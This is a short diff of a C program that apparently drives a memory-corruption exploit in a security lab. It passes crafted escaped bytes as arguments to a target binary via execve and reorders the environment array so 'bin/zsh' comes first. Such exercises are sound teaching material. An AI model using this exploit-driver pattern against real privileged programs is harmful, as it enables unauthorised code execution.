@@ -19,10 +19,9 @@ int main(void)
             "\x63\xf3\xf5\xf7";
   args[2] = NULL;
 
-  env[0] = NULL;
-  env[1] = "bin/zsh";
+  env[0] = "bin/zsh";
+  env[1] = NULL;
 
-  printf("Calling execve with target: %s\n", TARGET);
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
